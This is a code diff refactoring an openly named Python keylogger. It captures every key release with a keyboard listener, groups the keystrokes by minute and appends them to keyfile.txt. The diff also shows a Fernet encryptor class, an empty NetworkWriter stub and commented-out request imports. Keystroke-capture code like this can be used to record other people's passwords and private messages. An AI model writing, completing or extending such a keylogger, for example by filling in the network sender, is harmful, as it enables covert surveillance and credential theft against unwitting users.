@@ -4,11 +4,13 @@ from cryptography.fernet import Fernet
 # from requests import request
 # import json
 
+# ===================== Service (State) =====================
+
 class KeyLoggerService:
     def __init__(self):
-        self.global_log = []
-        self.log_l = {}
-        self.long_str = ""
+        self.global_log = []   
+        self.log_l = {}        
+        self.long_str = ""     
 
     @staticmethod
     def get_time():
@@ -17,18 +19,31 @@ class KeyLoggerService:
         return formatted_time
 
     def make_long_str(self, key):
-        """Makes a long str to chek the last characters"""
+        """Build 'exit' detector tail from printable chars only."""
         if hasattr(key, 'char') and key.char:
             self.long_str += key.char
 
     def make_dict(self, key):
-        """Making The directory of the log"""
+        """Accumulate raw key events under the current minute."""
         now = self.get_time()
         if now in self.log_l:
             self.log_l[now].append(key)
         else:
             self.log_l[now] = [key]
 
+
+# ===================== Writer (File Sink) =====================
+
+class FileWriter:
+    def outing_to_file(self, character):
+        with open("keyfile.txt", "a", encoding="utf-8") as log_key:
+            for i in character:          
+                for j in i:             
+                    char = f"{j}\n{i[j]}\n"
+                    log_key.write(char)
+
+
+# ===================== Manager (Flow) =====================
 
 class KeyLoggerManager:
     def __init__(self, service, writer):
@@ -40,24 +55,27 @@ class KeyLoggerManager:
         self.writer = writer
 
     def key_for_log(self, key):
-        """Loging Every key to all the function needed"""
+        """Handle each key event: update state, maybe flush, maybe stop."""
         self.service.make_long_str(key)
         self.service.make_dict(key)
+
         if self.service.long_str[-4:] == "exit":
             print("Detected 'exit' key:", list(self.service.long_str))
-            self.service.long_str = ""
+            self.service.long_str = ""  # איפוס הזנב בלבד
+
         elif key == keyboard.Key.space:
-            self.writer.outing_to_file(self.service.log_l)
             self.service.global_log.append(self.service.log_l)
             self.service.log_l = {}
+
         elif key == keyboard.Key.esc:
-            if self.service.log_l:
-                self.service.global_log.append(self.service.log_l)
-            for d in self.service.global_log:
-                for minute in d:
-                    print(f"{minute}\n{d[minute]} ")
-            for d in self.service.global_log:
-                self.writer.outing_to_file(d)
+            self.service.global_log.append(self.service.log_l)
+
+            for i in self.service.global_log:
+                for j in i:
+                    print(f"{j}\n{i[j]} ")
+
+            self.writer.outing_to_file(self.service.global_log)
+
             self.service.log_l = {}
             return False
         return None
@@ -69,14 +87,8 @@ class KeyLoggerManager:
         with keyboard.Listener(on_release=self.key_for_log) as listener:
             listener.join()
 
-class FileWriter:
-    def outing_to_file(self, character):
-        """Export to file"""
-        with open("keyfile.txt", "a", encoding="utf-8") as f:
-            for minute, items in character.items():
-                f.write(minute + "\n")
-                for t in items:
-                    f.write(str(t) + "\n")
+
+# ===================== Encryptor (unchanged API) =====================
 
 class Encryptor:
     def __init__(self, key_path):
@@ -112,8 +124,12 @@ class Encryptor:
         with open(output_filename, "wb") as fout:
             fout.write(dec)
 
+
 class NetworkWriter:
     pass
+
+
+# ===================== Main =====================
 
 if __name__ == "__main__":
     # Logging
